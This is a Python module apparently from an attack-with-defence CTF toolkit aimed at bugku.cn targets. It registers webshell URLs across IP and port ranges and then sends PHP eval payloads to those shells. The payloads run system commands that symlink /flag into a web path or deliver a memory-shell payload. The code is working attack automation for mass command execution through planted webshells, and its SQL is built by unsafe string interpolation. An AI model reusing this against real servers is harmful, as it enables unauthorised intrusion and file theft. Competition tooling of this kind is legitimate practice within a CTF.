from code.func import *
from db.Utils import *
from code.CmdColor import *
from code.AttackCore import *
from config.MemShellConfig import *
from config.SimpleConfig import *
#
def init_webshell():
    sql = "DELETE FROM webshell;"
    try:
        execute_sql(sql)
    except:
        printRed("[-]清空webshell出错")

def init_behinder():
    sql = "DELETE FROM behinder;"
    try:
        execute_sql(sql)
    except:
        printRed("[-]清空behinder出错")
def setWebShell(ip,port,path,passwd,method):
    ip_list = get_ip_list(ip)
    port_list = get_port_list(port)
    if path[0] != "/":
        path = "/"+path
    init_webshell()
    for ip in ip_list:
        for port in port_list:
            ##排除己方靶机，防止误伤
            if f"{ip}:{port}" == selftarget:
                continue
            webshell = f"{webshell_method}://{ip}.awd.bugku.cn:{port}{path}"
            sql = f"insert into webshell(webshell,passwd,method)values('{webshell}','{passwd}','{method}');"
            try:
                # print(sql)
                execute_sql(sql)
            except:
                printRed("[-]数据库执行错误")
def upMemShell(webshell,passwd,method,softLink=SoftLink):
    if softLink == True:
        linkName = f"chocol{softLinkRand()}.css"
        softLink_shellcode = f"""system('ln -s /flag {SoftLinkPath}{linkName}');file_put_contents('{SoftLinkPath}index.html','');"""
        ip = re.findall(r"//((.*?):(.*?))/", webshell)[0][0]
        webSoftLink = f"{webshell_method}://{ip}{WebSoftLinkPath}{linkName}"
        try:
            insert_softLink(ip, webSoftLink)
        except:
            printRed("[-]插入数据库错误")
        data = {}
        if method == "get":
            data[passwd] = '@eval($_GET[z0]);'
            data['z0'] = softLink_shellcode
            try:
                res = requests.get(webshell, params=data, timeout=5)
                printRed(f"[-]{webshell}")
            except:
                printGreen(f"[+]{webshell}")
        elif method == "post":
            data[passwd] = '@eval($_POST[z0]);'
            data['z0'] = softLink_shellcode
            try:
                res = requests.post(webshell, data=data, timeout=3)
                printRed(f"[-]{webshell}")
            except:
                printGreen(f"[+]{webshell}")
        else:
            pass
    else:
        data = {}
        if method == "get":
            data[passwd] = '@eval($_GET[z0]);'
            data['z0'] = final_shellcode
            try:
                res = requests.get(webshell, params=data, timeout=5)
                printRed(f"[-]{webshell}")
            except:
                printGreen(f"[+]{webshell}")
        elif method == "post":
            data[passwd] = '@eval($_POST[z0]);'
            data['z0'] = final_shellcode
            try:
                res = requests.post(webshell, data=data, timeout=3)
                printRed(f"[-]{webshell}")
            except:
                printGreen(f"[+]{webshell}")
        else:
            pass

def setBehinder(ip,port,path,passwd):
    ip_list = get_ip_list(ip)
    port_list = get_port_list(port)
    if path[0] != "/":
        path = "/" + path
    init_behinder()
    for ip in ip_list:
        for port in port_list:
            ##排除己方靶机，防止误伤
            if f"{ip}:{port}" == selftarget:
                continue
            behinder = f"{webshell_method}://{ip}.awd.bugku.cn:{port}{path}"
            sql = f"insert into behinder(behinder,passwd)values('{behinder}','{passwd}');"
            try:
                execute_sql(sql)
            except:
                printRed("[-]数据库执行错误(behinder)")

if __name__ == '__main__':
    # url = "http://39.105.92.157:8801/assets/scripts/pass.php"
    # setWebShell('127.0.0.1','80-90','asse/eee/a.php','pass','post')
    # upMemShell()
    #setBehinder('127.0.0.1','80-81','asse/eee/a.php','pass')
    pass